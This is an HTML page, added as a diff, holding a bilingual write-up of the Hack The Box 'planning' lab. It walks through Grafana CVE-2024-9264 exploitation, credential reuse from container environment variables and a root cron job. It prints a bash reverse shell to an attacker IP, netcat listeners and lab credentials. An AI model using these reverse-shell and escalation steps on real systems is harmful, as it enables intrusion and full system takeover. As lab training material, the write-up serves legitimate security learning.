@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>planning | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">planning</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The attack began by discovering a subdomain <code>grafana.planning.htb</code> hosting Grafana v11.0.0. Using provided default credentials, I accessed the Grafana instance and exploited CVE-2024-9264, a critical vulnerability allowing arbitrary file read and remote code execution through malicious plugin installation.</p>
+                    <p>The exploit leveraged the plugin installation mechanism to execute a reverse shell, granting root access within a Docker container. By examining environment variables in the containerized Grafana instance, I discovered SSH credentials for the user <code>enzo</code>, which provided access to the host system.</p>
+                    <p>Privilege escalation was achieved by discovering a locally-running web application on port 8000 that managed cron jobs. After finding hardcoded credentials in a JSON configuration file, I authenticated to this cron management panel and created a malicious cron job that executed a reverse shell script as root, compromising the entire system.</p>
+                    <p><strong>Technologies/Exploits:</strong> Grafana CVE-2024-9264 (LFI/RCE via plugin installation), Docker container escape through credential disclosure, cron job manipulation for privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>The machine description provided default credentials that would prove useful later:</p>
+                <pre><code class="language-plaintext">admin:0D5oT70Fq13EvB5r</code></pre>
+
+                <p>Starting with an nmap scan to identify open services:</p>
+                <p><img src="./media/image6.png" alt="Nmap scan results showing open ports including HTTP and SSH" /></p>
+
+                <p>The scan reveals standard web services. I add the virtual host <code>planning.htb</code> to my <code>/etc/hosts</code> file for easier navigation.</p>
+
+                <h2>Web Enumeration - Planning.htb</h2>
+                <p>Running <code>whatweb</code> to gather more information about the web technologies:</p>
+                <pre><code class="language-bash">whatweb http://planning.htb</code></pre>
+
+                <p>The output reveals:</p>
+                <pre><code class="language-plaintext">http://planning.htb [200 OK] Bootstrap 4.4.1, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]</code></pre>
+
+                <p>The site appears to be an online education platform. While browsing, I discover an interesting course enrollment form that makes POST requests - this could be a potential attack vector:</p>
+                <p><img src="./media/image4.png" alt="Course enrollment form showing POST request functionality" /></p>
+
+                <p>Running gobuster for directory enumeration doesn't reveal anything particularly suspicious:</p>
+                <p><img src="./media/image10.png" alt="Gobuster directory enumeration results" /></p>
+
+                <h3>Testing the Enrollment Form</h3>
+                <p>Using Burp Suite to intercept and manipulate requests, I notice that removing certain properties from the POST request causes a 500 Internal Server Error. This indicates insufficient input validation, which could be exploitable:</p>
+                <p><img src="./media/image5.png" alt="Burp Suite showing 500 error when manipulating POST parameters" /></p>
+
+                <p>I also find a course search functionality at <code>/index.php</code>:</p>
+                <p><img src="./media/image11.png" alt="Course search interface" /></p>
+                <p><img src="./media/image13.png" alt="Course search functionality details" /></p>
+
+                <p>However, testing for SQL injection and other common vulnerabilities doesn't yield results.</p>
+
+                <h2>Subdomain Discovery</h2>
+                <p>Shifting focus to virtual host enumeration with gobuster:</p>
+                <p><img src="./media/image12.png" alt="Gobuster vhost enumeration discovering grafana subdomain" /></p>
+
+                <p>Excellent! I discover a subdomain: <code>grafana.planning.htb</code>. I add this to my <code>/etc/hosts</code> file and navigate to it.</p>
+
+                <h2>Grafana Authentication</h2>
+                <p>The subdomain hosts a Grafana instance. Using the credentials provided in the machine description (<code>admin:0D5oT70Fq13EvB5r</code>), I successfully authenticate.</p>
+
+                <p>Once logged in, I can see the Grafana version from the UI:</p>
+                <pre><code class="language-plaintext">Grafana v11.0.0 (83b9528bce)</code></pre>
+
+                <h2>Vulnerability Research - CVE-2024-9264</h2>
+                <p>This specific version of Grafana is vulnerable to <a href="https://www.cvedetails.com/cve/CVE-2024-9264/">CVE-2024-9264</a>, a critical vulnerability that allows both Local File Inclusion (LFI) and Remote Code Execution (RCE).</p>
+
+                <p>I find a proof-of-concept exploit on GitHub: <a href="https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/blob/main/poc.py">https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/blob/main/poc.py</a></p>
+
+                <h3>Understanding the Exploit</h3>
+                <p>The exploit works in two stages:</p>
+                <ol>
+                    <li>First POST request: Writes a reverse shell payload to <code>/tmp/rev</code> on the Grafana server</li>
+                    <li>Second POST request: Installs a community plugin called <code>shellfs</code>, loads it, and executes the previously saved reverse shell</li>
+                </ol>
+
+                <p>This vulnerability leverages Grafana's plugin installation mechanism to achieve code execution. The plugin system doesn't properly validate or sanitize plugin sources, allowing malicious code to be loaded and executed.</p>
+
+                <h2>Initial Access - Exploiting Grafana</h2>
+                <p>I execute the proof-of-concept exploit against the Grafana instance. After setting up a netcat listener:</p>
+                <pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+                <p>The exploit successfully grants me a reverse shell as root - but this is root within a Docker container, not the actual host system.</p>
+
+                <h3>Container Enumeration</h3>
+                <p>To find a way to escape the container or access the host, I examine environment variables:</p>
+                <pre><code class="language-bash">env</code></pre>
+
+                <p>Among the environment variables, I discover credentials:</p>
+                <pre><code class="language-plaintext">GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+GF_SECURITY_ADMIN_USER=enzo</code></pre>
+
+                <p>These credentials appear to be for a user on the host system.</p>
+
+                <h2>SSH Access to Host System</h2>
+                <p>Using the discovered credentials, I attempt SSH access to the host machine:</p>
+                <pre><code class="language-bash">ssh enzo@planning.htb</code></pre>
+
+                <p>Success! The credentials work, and I now have shell access as the user <code>enzo</code> on the actual host system. I can retrieve the user flag:</p>
+                <p><img src="./media/image9.png" alt="Successfully retrieved user flag" /></p>
+
+                <h2>Local Service Enumeration</h2>
+                <p>To identify potential privilege escalation vectors, I check for services running locally on the host:</p>
+                <pre><code class="language-bash">ss -tuln</code></pre>
+
+                <p><img src="./media/image1.png" alt="Local services listening on various ports" /></p>
+
+                <p>Several interesting ports are listening on localhost, including ports 3000, 8000, and others.</p>
+
+                <h3>Discovering Configuration Files</h3>
+                <p>Exploring the filesystem, I find an interesting directory in <code>/opt/crontab</code> containing a JSON configuration file:</p>
+                <p><img src="./media/image7.png" alt="JSON configuration file with hardcoded credentials" /></p>
+
+                <p>The JSON file contains another set of credentials:</p>
+                <pre><code class="language-plaintext">P4ssw0rdS0pRi0T3c</code></pre>
+
+                <p>I note this password for potential future use.</p>
+
+                <h2>Accessing the Cron Management Panel</h2>
+                <p>Investigating the local services, I determine that:</p>
+                <ul>
+                    <li>Port 3000 is the Grafana instance</li>
+                    <li>Port 8000 hosts an unknown web application</li>
+                </ul>
+
+                <p>To access port 8000 from my attacking machine, I set up an SSH tunnel:</p>
+                <pre><code class="language-bash">ssh -L 8000:localhost:8000 enzo@planning.htb</code></pre>
+
+                <p>Navigating to <code>http://localhost:8000</code>, I'm presented with HTTP Basic Authentication. Testing various credential combinations, I find that <code>root:P4ssw0rdS0pRi0T3c</code> successfully authenticates.</p>
+
+                <p>The application appears to be a web-based cron job management panel, allowing the creation and modification of scheduled tasks.</p>
+
+                <h2>Privilege Escalation - Malicious Cron Job</h2>
+                <p>Since I can create cron jobs through this web interface and it's running with root privileges, I can leverage this to execute arbitrary commands as root.</p>
+
+                <p>I create a malicious cron job through the panel:</p>
+                <p><img src="./media/image3.png" alt="Creating a malicious cron job in the web panel" /></p>
+
+                <h3>Preparing the Payload</h3>
+                <p>First, I create a reverse shell script in the <code>enzo</code> user's home directory:</p>
+                <pre><code class="language-bash">cat > /home/enzo/xd.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.15/9001 0>&1
+EOF
+
+chmod +x /home/enzo/xd.sh</code></pre>
+
+                <p>Then, through the cron management panel, I schedule this script to execute as root:</p>
+                <p><img src="./media/image8.png" alt="Cron job configured to execute the reverse shell script" /></p>
+
+                <p>Setting up my listener to catch the root shell:</p>
+                <pre><code class="language-bash">nc -lvnp 9001</code></pre>
+
+                <p>After the cron job executes, I receive a root shell:</p>
+                <p><img src="./media/image2.png" alt="Successfully obtained root shell" /></p>
+
+                <p>With root access, I can now retrieve the root flag and complete the machine.</p>
+
+                <h2>Conclusion</h2>
+                <p>This machine demonstrated a realistic attack chain involving:</p>
+                <ul>
+                    <li>Subdomain enumeration to discover hidden services</li>
+                    <li>Exploiting a recent Grafana vulnerability (CVE-2024-9264)</li>
+                    <li>Container escape through credential disclosure</li>
+                    <li>Privilege escalation via insecure cron job management</li>
+                </ul>
+
+                <p>The key takeaways include the importance of securing plugin installation mechanisms, properly isolating containerized applications, avoiding hardcoded credentials in configuration files, and restricting access to privileged task schedulers.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> El ataque comenzó descubriendo un subdominio <code>grafana.planning.htb</code> alojando Grafana v11.0.0. Utilizando las credenciales proporcionadas por defecto, accedí a la instancia de Grafana y exploté CVE-2024-9264, una vulnerabilidad crítica que permite lectura arbitraria de archivos y ejecución remota de código mediante la instalación de plugins maliciosos.</p>
+                    <p>El exploit aprovechó el mecanismo de instalación de plugins para ejecutar una reverse shell, otorgándome acceso root dentro de un contenedor Docker. Al examinar las variables de entorno en la instancia de Grafana contenedorizada, descubrí credenciales SSH para el usuario <code>enzo</code>, que proporcionaron acceso al sistema host.</p>
+                    <p>La escalada de privilegios se logró descubriendo una aplicación web corriendo localmente en el puerto 8000 que gestionaba tareas cron. Tras encontrar credenciales hardcodeadas en un archivo de configuración JSON, me autentiqué en este panel de gestión de cron y creé una tarea cron maliciosa que ejecutó un script de reverse shell como root, comprometiendo el sistema completo.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> Grafana CVE-2024-9264 (LFI/RCE mediante instalación de plugins), escape de contenedor Docker a través de divulgación de credenciales, manipulación de tareas cron para escalada de privilegios.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>La descripción de la máquina proporcionó credenciales por defecto que resultarían útiles más adelante:</p>
+                <pre><code class="language-plaintext">admin:0D5oT70Fq13EvB5r</code></pre>
+
+                <p>Comienzo con un escaneo de nmap para identificar servicios abiertos:</p>
+                <p><img src="./media/image6.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo HTTP y SSH" /></p>
+
+                <p>El escaneo revela servicios web estándar. Añado el virtual host <code>planning.htb</code> a mi archivo <code>/etc/hosts</code> para facilitar la navegación.</p>
+
+                <h2>Enumeración Web - Planning.htb</h2>
+                <p>Ejecuto <code>whatweb</code> para recopilar más información sobre las tecnologías web:</p>
+                <pre><code class="language-bash">whatweb http://planning.htb</code></pre>
+
+                <p>La salida revela:</p>
+                <pre><code class="language-plaintext">http://planning.htb [200 OK] Bootstrap 4.4.1, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]</code></pre>
+
+                <p>El sitio parece ser una plataforma de educación online. Navegando, descubro un formulario interesante de inscripción a cursos que hace peticiones POST - esto podría ser un potencial vector de ataque:</p>
+                <p><img src="./media/image4.png" alt="Formulario de inscripción a curso mostrando funcionalidad de petición POST" /></p>
+
+                <p>Ejecutando gobuster para enumeración de directorios no revela nada particularmente sospechoso:</p>
+                <p><img src="./media/image10.png" alt="Resultados de enumeración de directorios con gobuster" /></p>
+
+                <h3>Probando el Formulario de Inscripción</h3>
+                <p>Usando Burp Suite para interceptar y manipular peticiones, noto que eliminar ciertas propiedades de la petición POST causa un error 500 Internal Server Error. Esto indica validación de entrada insuficiente, lo cual podría ser explotable:</p>
+                <p><img src="./media/image5.png" alt="Burp Suite mostrando error 500 al manipular parámetros POST" /></p>
+
+                <p>También encuentro una funcionalidad de búsqueda de cursos en <code>/index.php</code>:</p>
+                <p><img src="./media/image11.png" alt="Interfaz de búsqueda de cursos" /></p>
+                <p><img src="./media/image13.png" alt="Detalles de la funcionalidad de búsqueda de cursos" /></p>
+
+                <p>Sin embargo, probar para inyección SQL y otras vulnerabilidades comunes no produce resultados.</p>
+
+                <h2>Descubrimiento de Subdominios</h2>
+                <p>Cambio el enfoque a enumeración de virtual hosts con gobuster:</p>
+                <p><img src="./media/image12.png" alt="Enumeración de vhost con gobuster descubriendo el subdominio grafana" /></p>
+
+                <p>¡Excelente! Descubro un subdominio: <code>grafana.planning.htb</code>. Lo añado a mi archivo <code>/etc/hosts</code> y navego hacia él.</p>
+
+                <h2>Autenticación en Grafana</h2>
+                <p>El subdominio aloja una instancia de Grafana. Usando las credenciales proporcionadas en la descripción de la máquina (<code>admin:0D5oT70Fq13EvB5r</code>), me autentico exitosamente.</p>
+
+                <p>Una vez dentro, puedo ver la versión de Grafana desde la UI:</p>
+                <pre><code class="language-plaintext">Grafana v11.0.0 (83b9528bce)</code></pre>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2024-9264</h2>
+                <p>Esta versión específica de Grafana es vulnerable a <a href="https://www.cvedetails.com/cve/CVE-2024-9264/">CVE-2024-9264</a>, una vulnerabilidad crítica que permite tanto Local File Inclusion (LFI) como Remote Code Execution (RCE).</p>
+
+                <p>Encuentro una prueba de concepto del exploit en GitHub: <a href="https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/blob/main/poc.py">https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/blob/main/poc.py</a></p>
+
+                <h3>Entendiendo el Exploit</h3>
+                <p>El exploit funciona en dos etapas:</p>
+                <ol>
+                    <li>Primera petición POST: Escribe un payload de reverse shell en <code>/tmp/rev</code> en el servidor Grafana</li>
+                    <li>Segunda petición POST: Instala un plugin de la comunidad llamado <code>shellfs</code>, lo carga y ejecuta la reverse shell previamente guardada</li>
+                </ol>
+
+                <p>Esta vulnerabilidad aprovecha el mecanismo de instalación de plugins de Grafana para conseguir ejecución de código. El sistema de plugins no valida ni sanitiza adecuadamente las fuentes de plugins, permitiendo que se cargue y ejecute código malicioso.</p>
+
+                <h2>Acceso Inicial - Explotando Grafana</h2>
+                <p>Ejecuto la prueba de concepto del exploit contra la instancia de Grafana. Tras configurar un listener de netcat:</p>
+                <pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+                <p>El exploit me otorga exitosamente una reverse shell como root - pero esto es root dentro de un contenedor Docker, no el sistema host real.</p>
+
+                <h3>Enumeración del Contenedor</h3>
+                <p>Para encontrar una manera de escapar del contenedor o acceder al host, examino las variables de entorno:</p>
+                <pre><code class="language-bash">env</code></pre>
+
+                <p>Entre las variables de entorno, descubro credenciales:</p>
+                <pre><code class="language-plaintext">GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+GF_SECURITY_ADMIN_USER=enzo</code></pre>
+
+                <p>Estas credenciales parecen ser para un usuario en el sistema host.</p>
+
+                <h2>Acceso SSH al Sistema Host</h2>
+                <p>Usando las credenciales descubiertas, intento acceso SSH a la máquina host:</p>
+                <pre><code class="language-bash">ssh enzo@planning.htb</code></pre>
+
+                <p>¡Éxito! Las credenciales funcionan, y ahora tengo acceso shell como usuario <code>enzo</code> en el sistema host real. Puedo recuperar la flag de usuario:</p>
+                <p><img src="./media/image9.png" alt="Flag de usuario recuperada exitosamente" /></p>
+
+                <h2>Enumeración de Servicios Locales</h2>
+                <p>Para identificar potenciales vectores de escalada de privilegios, compruebo servicios corriendo localmente en el host:</p>
+                <pre><code class="language-bash">ss -tuln</code></pre>
+
+                <p><img src="./media/image1.png" alt="Servicios locales escuchando en varios puertos" /></p>
+
+                <p>Varios puertos interesantes están escuchando en localhost, incluyendo los puertos 3000, 8000 y otros.</p>
+
+                <h3>Descubriendo Archivos de Configuración</h3>
+                <p>Explorando el sistema de archivos, encuentro un directorio interesante en <code>/opt/crontab</code> conteniendo un archivo de configuración JSON:</p>
+                <p><img src="./media/image7.png" alt="Archivo de configuración JSON con credenciales hardcodeadas" /></p>
+
+                <p>El archivo JSON contiene otro conjunto de credenciales:</p>
+                <pre><code class="language-plaintext">P4ssw0rdS0pRi0T3c</code></pre>
+
+                <p>Anoto esta contraseña para un potencial uso futuro.</p>
+
+                <h2>Accediendo al Panel de Gestión de Cron</h2>
+                <p>Investigando los servicios locales, determino que:</p>
+                <ul>
+                    <li>El puerto 3000 es la instancia de Grafana</li>
+                    <li>El puerto 8000 aloja una aplicación web desconocida</li>
+                </ul>
+
+                <p>Para acceder al puerto 8000 desde mi máquina atacante, configuro un túnel SSH:</p>
+                <pre><code class="language-bash">ssh -L 8000:localhost:8000 enzo@planning.htb</code></pre>
+
+                <p>Navegando a <code>http://localhost:8000</code>, se me presenta autenticación HTTP Basic. Probando varias combinaciones de credenciales, encuentro que <code>root:P4ssw0rdS0pRi0T3c</code> autentica exitosamente.</p>
+
+                <p>La aplicación parece ser un panel de gestión de tareas cron basado en web, permitiendo la creación y modificación de tareas programadas.</p>
+
+                <h2>Escalada de Privilegios - Tarea Cron Maliciosa</h2>
+                <p>Dado que puedo crear tareas cron a través de esta interfaz web y está ejecutándose con privilegios root, puedo aprovechar esto para ejecutar comandos arbitrarios como root.</p>
+
+                <p>Creo una tarea cron maliciosa a través del panel:</p>
+                <p><img src="./media/image3.png" alt="Creando una tarea cron maliciosa en el panel web" /></p>
+
+                <h3>Preparando el Payload</h3>
+                <p>Primero, creo un script de reverse shell en el directorio home del usuario <code>enzo</code>:</p>
+                <pre><code class="language-bash">cat > /home/enzo/xd.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.15/9001 0>&1
+EOF
+
+chmod +x /home/enzo/xd.sh</code></pre>
+
+                <p>Luego, a través del panel de gestión de cron, programo este script para ejecutarse como root:</p>
+                <p><img src="./media/image8.png" alt="Tarea cron configurada para ejecutar el script de reverse shell" /></p>
+
+                <p>Configurando mi listener para capturar la shell de root:</p>
+                <pre><code class="language-bash">nc -lvnp 9001</code></pre>
+
+                <p>Después de que la tarea cron se ejecuta, recibo una shell de root:</p>
+                <p><img src="./media/image2.png" alt="Shell de root obtenida exitosamente" /></p>
+
+                <p>Con acceso root, ahora puedo recuperar la flag de root y completar la máquina.</p>
+
+                <h2>Conclusión</h2>
+                <p>Esta máquina demostró una cadena de ataque realista involucrando:</p>
+                <ul>
+                    <li>Enumeración de subdominios para descubrir servicios ocultos</li>
+                    <li>Explotación de una vulnerabilidad reciente de Grafana (CVE-2024-9264)</li>
+                    <li>Escape de contenedor mediante divulgación de credenciales</li>
+                    <li>Escalada de privilegios mediante gestión insegura de tareas cron</li>
+                </ul>
+
+                <p>Las conclusiones clave incluyen la importancia de asegurar los mecanismos de instalación de plugins, aislar apropiadamente las aplicaciones contenedorizadas, evitar credenciales hardcodeadas en archivos de configuración y restringir el acceso a programadores de tareas privilegiadas.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
